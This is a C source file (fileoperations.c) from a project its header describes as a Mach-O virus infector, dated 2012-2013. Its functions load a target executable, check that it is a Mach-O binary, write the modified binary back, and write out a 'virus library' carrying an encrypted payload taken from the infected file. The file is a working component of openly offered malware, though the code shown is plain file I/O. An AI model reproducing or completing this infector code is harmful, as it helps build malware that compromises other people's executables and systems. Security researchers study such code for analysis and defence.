/*     _____                                                                  
 *  __|_    |__  ____   _  ______  ______  ______   __    _____  _____   ___  
 * |    |      ||    \ | ||   ___||   ___||   ___|_|  |_ /     \|     | |   | 
 * |    |      ||     \| ||   ___||   ___||   |__|_    _||     ||     \ |___| 
 * |____|    __||__/\____||___|   |______||______| |__|  \_____/|__|\__\|___| 
 *    |_____|                                                                 
 *
 * A mach-o virus infector
 *
 * Copyright (c) fG!, 2012,2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * fileoperations.c
 *
 */

#include "fileoperations.h"
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <mach-o/loader.h>
#include "configuration.h"

#pragma mark Read operations

/*
 * function that will read the target binary into our buffer and set some information into the structure
 */
uint8_t 
init_target(target_info_t *targetInfo)
{
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    // read target file into a buffer
    targetInfo->fileSize = read_target(&(targetInfo->buffer), targetInfo->targetBinaryPath);
    // failure if size is 0
    if (targetInfo->fileSize == 0)
    {
#if DEBUG
        printf("[ERROR] File size is 0, init_target failed!\n");
#endif
        return 1;
    }
    // verify if it's a valid mach-o target
    uint32_t magic = *(uint32_t*)(targetInfo->buffer);
    if (magic == MH_MAGIC || magic == MH_MAGIC_64)
    {
        return 0;
    }
#if DEBUG
    fprintf(stderr, "[ERROR] Target %s is not a mach-o binary or is fat (not supported)!\n", targetInfo->targetBinaryPath);
#endif
    return 1;
}

/*
 * read the target file into a buffer
 */
uint64_t 
read_target(uint8_t **targetBuffer, const char *target)
{
#if DEBUG
    printf("[DEBUG] Executing %s, reading %s\n", __FUNCTION__, target);
#endif
    FILE *in_file;
    in_file = fopen(target, "r");
    if (!in_file)
    {
#if DEBUG
		fprintf(stderr, "[ERROR] Could not open target file %s!\n", target);
#endif
        return 0;
    }
    if (fseek(in_file, 0, SEEK_END))
    {
#if DEBUG
		fprintf(stderr, "[ERROR] Fseek failed at %s\n", target);
#endif
        return 0;
    }
    
    long fileSize = ftell(in_file);
    
    if (fseek(in_file, 0, SEEK_SET))
    {
#if DEBUG
		fprintf(stderr, "[ERROR] Fseek failed at %s\n", target);
#endif
        return 0;
    }
    
    *targetBuffer = malloc(fileSize);
    
    if (*targetBuffer == NULL)
    {
#if DEBUG
        fprintf(stderr, "[ERROR] Malloc failed!\n");
#endif
        return 0;
    }
    
    fread(*targetBuffer, fileSize, 1, in_file);
	if (ferror(in_file))
	{
#if DEBUG
		fprintf(stderr, "[ERROR] fread failed at %s\n", target);
#endif
        free(*targetBuffer);
        return 0;
	}
    fclose(in_file);  
    return fileSize;
}

#pragma mark Write operations

uint8_t
write_target(uint8_t *buffer, uint64_t bufsize, const char *targetFullPath)
{
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    FILE *targetFile = NULL;
    targetFile = fopen(targetFullPath, "wb");
    if (!targetFile)
    {
#if DEBUG
        printf("[ERROR] Can't open target file %s\n", targetFullPath);
#endif
        return 1;
    }
    fwrite(buffer, bufsize, 1, targetFile);
    if (ferror(targetFile))
    {
#if DEBUG
        printf("[ERROR] fwrite failed at %s\n", targetFullPath);
#endif
        return 1;
    }
    return 0;
}

/*
 * function to write the modified virus library (with encrypted payload from infected file)
 * returns 0 on success, 1 on failure
 */
uint8_t
write_library(target_info_t *targetInfo)
{
#if DEBUG
    printf("[DEBUG] Executing %s\n", __FUNCTION__);
#endif
    FILE *targetFile = NULL;
    targetFile = fopen(targetInfo->injectionTargetPath, "wb");
    if (!targetFile)
    {
#if DEBUG
        printf("[ERROR] Can't open target file %s\n", targetInfo->injectionTargetPath);
#endif
        return 1;
    }
    
    fwrite(targetInfo->virus.buffer, targetInfo->virus.size, 1, targetFile);
    if (ferror(targetFile))
    {
#if DEBUG
        printf("[ERROR] fwrite failed at %s\n", targetInfo->injectionTargetPath);
#endif
        return 1;
    }
    fclose(targetFile);
    return 0;
}
